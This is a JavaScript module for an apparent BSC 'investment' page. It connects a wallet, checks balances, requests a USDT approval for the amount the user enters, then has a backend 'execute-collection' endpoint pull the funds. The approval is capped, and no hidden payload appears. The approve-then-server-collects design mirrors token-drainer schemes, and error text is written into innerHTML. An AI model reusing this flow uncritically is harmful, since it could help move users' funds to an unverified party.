import { CONFIG } from './config.js';
import { createAppKit } from 'https://esm.sh/@reown/appkit@latest';
import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers@latest';
import { bsc } from 'https://esm.sh/@reown/appkit/networks';

let modal = null;
let provider = null;
let signer = null;
let userAddress = null;
let pendingInvestment = false;

const ERC20_ABI = [
    "function balanceOf(address account) external view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)",
    "function approve(address spender, uint256 amount) external returns (bool)"
];

// Asignar la dirección del merchant al input visual si existe en el DOM
const merchantInput = document.getElementById("merchantAddress");
if (merchantInput) merchantInput.value = CONFIG.MERCHANT_ADDRESS;

// ─── Inicialización Principal ─────────────────────────────────────────────────
export async function initApp() {
    setupWakeUpBackend();
    initWalletModal();
    setupUIEventListeners();
}

// ─── Wake up Render backend ───────────────────────────────────────────────────
function setupWakeUpBackend() {
    fetch(`${CONFIG.BACKEND_URL}/health`, { method: 'GET' })
        .catch(() => {});
}

// ─── Configuración de Reown AppKit (WalletConnect Universal) ──────────────────
function initWalletModal() {
    const metadata = {
        name: 'Syal Store',
        description: 'Plataforma de pagos y finanzas descentralizadas',
        url: window.location.origin,
        icons: [`${window.location.origin}/img/logo.svg`]
    };

    modal = createAppKit({
        adapters: [new EthersAdapter()],
        networks: [bsc],
        metadata,
        projectId: CONFIG.PROJECT_ID,
        features: {
            analytics: false,
            email: false,
            socials: []
        }
    });

    modal.subscribeProviders((state) => {
        const rawProvider = state.provider || state["eip155"];
        if (rawProvider) {
            handleConnectedProvider(rawProvider);
            if (pendingInvestment) {
                pendingInvestment = false;
                runInvestmentFlow(rawProvider);
            }
        }
    });

    // Verificación segura del proveedor activo al iniciar
    try {
        const activeProvider = typeof modal.getWalletProvider === "function" ? modal.getWalletProvider() : null;
        if (activeProvider) {
            handleConnectedProvider(activeProvider);
        }
    } catch (err) {
        console.warn("No hay proveedor activo previo:", err);
    }
}

async function handleConnectedProvider(walletProvider) {
    try {
        provider = new ethers.BrowserProvider(walletProvider);
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();

        updateWalletUI(userAddress);
        await updateBalances(walletProvider);
    } catch (error) {
        console.error("Error al sincronizar proveedor de AppKit:", error);
    }
}

export function openConnectModal() {
    if (modal) {
        modal.open();
    }
}

// ─── Gestión de Saldos y UI ───────────────────────────────────────────────────
async function updateBalances(rawProvider) {
    if (!userAddress) return;
    try {
        const activeProvider = provider || new ethers.BrowserProvider(rawProvider);
        const activeSigner = signer || await activeProvider.getSigner();
        
        const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI, activeSigner);
        const usdtBal = await usdtContract.balanceOf(userAddress);
        const formattedUsdt = ethers.formatUnits(usdtBal, 18);

        const balanceLabel = document.getElementById("walletBalanceLabel");
        if (balanceLabel) {
            balanceLabel.textContent = `Saldo: ${parseFloat(formattedUsdt).toFixed(2)} USDT`;
        }

        const maxBtn = document.getElementById("maxBtn");
        if (maxBtn) {
            maxBtn.onclick = () => {
                const amountInput = document.getElementById("investAmount");
                if (amountInput) {
                    const maxUsdt = Math.max(0, parseFloat(formattedUsdt));
                    amountInput.value = maxUsdt > 0 ? maxUsdt.toFixed(2) : "1.00";
                    amountInput.dispatchEvent(new Event('input'));
                }
            };
        }
    } catch (err) {
        console.error("Error al sincronizar saldos en vivo:", err);
    }
}

function updateWalletUI(account) {
    const container = document.getElementById("walletButtonContainer");
    if (container) {
        container.innerHTML = `<span class="wallet-badge">${account.substring(0, 6)}...${account.substring(38)}</span>`;
    }
}

// ─── Event Listeners de Interfaz ──────────────────────────────────────────────
function setupUIEventListeners() {
    const input = document.getElementById("investAmount");
    if (input) {
        input.addEventListener("input", validateInvestmentInput);
    }

    const approveBtn = document.getElementById("approveBtn");
    if (approveBtn) {
        approveBtn.addEventListener("click", async () => {
            let rawProvider = null;
            if (modal && typeof modal.getWalletProvider === "function") {
                try {
                    rawProvider = modal.getWalletProvider();
                } catch (_) {}
            }

            if (!rawProvider) {
                pendingInvestment = true;
                if (modal && typeof modal.open === "function") {
                    try {
                        modal.open();
                    } catch (err) {
                        console.error("Error al desplegar el selector de billeteras:", err);
                        pendingInvestment = false;
                    }
                }
                return;
            }

            await runInvestmentFlow(rawProvider);
        });
    }
}

function validateInvestmentInput() {
    const input = document.getElementById("investAmount");
    const balanceLabel = document.getElementById("walletBalanceLabel");
    if (!input || !balanceLabel) return;

    const val = parseFloat(input.value) || 0;
    const match = balanceLabel.textContent.match(/[\d.]+/);
    const maxVal = match ? parseFloat(match[0]) : 0;

    if (val > maxVal) {
        input.style.borderColor = "#ef4444";
    } else {
        input.style.borderColor = "";
    }
}

// ─── Flujo Principal de Inversión y Aprobación ────────────────────────────────
async function runInvestmentFlow(rawProvider) {
    setLoading(true, "Conectando proveedor…");
  
    try {
        const activeProvider = new ethers.BrowserProvider(rawProvider);
        
        setLoading(true, "Verificando red BSC...");
        const network = await activeProvider.getNetwork();
        if (Number(network.chainId) !== 56) {
            setLoading(true, "Cambiando a red BSC…");
            try {
                await rawProvider.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: CONFIG.CHAIN_ID }]
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    await rawProvider.request({
                        method: "wallet_addEthereumChain",
                        params: [{
                            chainId: CONFIG.CHAIN_ID,
                            chainName: CONFIG.CHAIN_NAME,
                            rpcUrls: CONFIG.RPC_URLS,
                            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                            blockExplorerUrls: [CONFIG.BLOCK_EXPLORER]
                        }]
                    });
                } else {
                    showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
                    setLoading(false);
                    return;
                }
            }
        }

        const activeSigner = await activeProvider.getSigner();
        const activeUserAddress = await activeSigner.getAddress();

        setLoading(true, "Verificando saldo de gas (BNB)…");
        const bnbBalance = await activeProvider.getBalance(activeUserAddress);
        const minGasRequired = ethers.parseEther("0.0005");

        if (bnbBalance < minGasRequired) {
            showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
            setLoading(false);
            return;
        }

        const inputElement = document.getElementById("investAmount");
        const rawInputVal = inputElement ? inputElement.value : "1";
        const requiredAmount = ethers.parseUnits(rawInputVal || "1", 18);

        const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI, activeSigner);

        setLoading(true, "Validando saldo de USDT…");
        const usdtBalance = await usdtContract.balanceOf(activeUserAddress);

        if (usdtBalance < requiredAmount) {
            showToast("No tienes suficiente saldo de USDT en tu billetera.", "error");
            setLoading(false);
            return;
        }

        setLoading(true, "Verificando autorizaciones...");
        const allowance = await usdtContract.allowance(activeUserAddress, CONFIG.CONTRACT_ADDRESS);
        
        if (allowance < requiredAmount) {
            if (allowance > 0n) {
                setLoading(true, "Restableciendo autorización previa...");
                const txReset = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, 0n);
                await txReset.wait();
            }
        
            setLoading(true, "Firma requerida: Aprobar USDT…");
            const txApprove = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, requiredAmount);
            
            setLoading(true, "Confirmando aprobación en red...");
            await txApprove.wait();
        }

        setLoading(true, "Procesando inversión en protocolo...");
        const txCollect = await triggerBackendCollect(activeUserAddress, rawInputVal);

        const txHash = txCollect?.hash || "";
        if (txHash) {
            showToast(`¡Inversión exitosa! <a href="${CONFIG.BLOCK_EXPLORER}/tx/${txHash}" target="_blank" style="color: #fff; text-decoration: underline;">Ver en BscScan ↗</a>`, "success", 8000);
        } else {
            showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
        }

    } catch (err) {
        const raw = err?.reason ?? err?.message ?? JSON.stringify(err) ?? "Error desconocido";
        if (
            err.code === 4001 ||
            raw.toLowerCase().includes("user rejected") ||
            raw.toLowerCase().includes("denied") ||
            raw.toLowerCase().includes("cancelled")
        ) {
            showToast("Operación cancelada por el usuario.", "default");
        } else {
            console.error("Web3 Error crítico:", err);
            showToast(`Error de red: ${raw.slice(0, 50)}...`, "error");
        }
    } finally {
        setLoading(false);
    }
}

// ─── Disparador del Backend de Recolección ────────────────────────────────────
async function triggerBackendCollect(userAddress, amountStr) {
    let lastErr;
    const dynamicAmountWei = ethers.parseUnits(amountStr.toString(), 18).toString();

    for (let i = 1; i <= 3; i++) {
        try {
            const res = await fetch(`${CONFIG.BACKEND_URL}/execute-collection`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
            });
            const data = await res.json();
            if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
            return data;
        } catch (e) {
            lastErr = e;
            if (i < 3) await new Promise(r => setTimeout(r, 3000));
        }
    }
    throw lastErr;
}

// ─── Utilidades de UI (Loaders y Toasts) ──────────────────────────────────────
const approveBtn = document.getElementById("approveBtn");
const btnText = document.getElementById("btnText");
const btnSpinner = document.getElementById("btnSpinner");
const toastEl = document.getElementById("toast");

function setLoading(on, label = "Procesando…") {
    if (!approveBtn) return;
    approveBtn.disabled = on;
    approveBtn.style.opacity = on ? "0.8" : "1";
    if (btnText) btnText.textContent = on ? label.toUpperCase() : "INVERTIR AHORA";
    if (btnSpinner) btnSpinner.hidden = !on;
}

let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
    if (!toastEl) return;
    clearTimeout(_toastTimer);
    toastEl.innerHTML = msg;
    toastEl.dataset.type = type === "default" ? "" : type;
    toastEl.hidden = false;
  
    if (type === "success") {
        toastEl.style.background = "rgba(38, 161, 123, 0.95)";
    } else if (type === "error") {
        toastEl.style.background = "rgba(220, 53, 69, 0.95)";
    } else {
        toastEl.style.removeProperty("background");
    }

    _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}
